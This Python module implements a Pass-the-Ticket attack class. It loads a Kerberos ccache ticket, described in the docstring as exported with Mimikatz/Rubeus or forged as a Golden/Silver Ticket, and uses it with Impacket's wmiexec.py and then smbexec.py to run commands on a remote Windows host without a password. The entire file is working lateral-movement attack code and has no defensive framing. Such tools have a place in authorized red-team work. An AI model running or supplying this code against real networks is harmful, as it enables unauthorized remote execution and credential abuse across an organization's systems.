"""
Pass-the-Ticket — Use an existing Kerberos ticket to access services.

The ticket can be exported from another session (Mimikatz/Rubeus),
created via Overpass-the-Hash, or forged (Golden/Silver Ticket).
Attempts WMI execution first, falls back to SMB.
"""

import os
import subprocess


class PassTheTicket:
    """Inject and use Kerberos tickets for remote execution."""

    def __init__(self, domain: str):
        self.domain = domain

    def execute(
        self,
        ccache_file: str,
        target: str,
        username: str,
        command: str = "whoami",
    ) -> bool:
        """
        Use a .ccache ticket to execute a command on the target.

        Tries wmiexec.py first, falls back to smbexec.py.
        Returns True on successful execution.
        """
        print(f"\n{'=' * 60}")
        print("PASS-THE-TICKET")
        print(f"{'=' * 60}")
        print(f"[*] Ticket: {ccache_file}")
        print(f"[*] Target: {target}")
        print(f"[*] User:   {username}")

        if not os.path.exists(ccache_file):
            print(f"[-] Ticket file not found: {ccache_file}")
            return False

        env = os.environ.copy()
        env["KRB5CCNAME"] = ccache_file

        if self._try_wmiexec(target, username, command, env):
            return True

        return self._try_smbexec(target, username, env)

    def _try_wmiexec(
        self, target: str, username: str, command: str, env: dict
    ) -> bool:
        """Attempt command execution via WMI."""
        print("\n[*] Attempting WMI execution via Kerberos...")

        cmd = [
            "wmiexec.py",
            f"{self.domain}/{username}@{target}",
            "-k", "-no-pass",
            command,
        ]

        try:
            print(f"[*] Executing: {' '.join(cmd)}")
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30, env=env
            )

            if result.returncode == 0 or result.stdout:
                print("[+] Pass-the-Ticket SUCCESS!")
                print(f"[+] Output:\n{result.stdout}")
                return True

            if result.stderr:
                print(f"[-] WMI failed: {result.stderr[:200]}")
        except Exception as e:
            print(f"[-] WMI error: {e}")

        return False

    def _try_smbexec(self, target: str, username: str, env: dict) -> bool:
        """Fallback: attempt execution via SMB."""
        print("[-] WMI failed, trying smbexec...")

        cmd = [
            "smbexec.py",
            f"{self.domain}/{username}@{target}",
            "-k", "-no-pass",
        ]

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=15, env=env
            )
            if result.stdout:
                print("[+] SMB execution succeeded!")
                return True
        except Exception as e:
            print(f"[-] SMB error: {e}")

        print("[-] Pass-the-Ticket failed")
        return False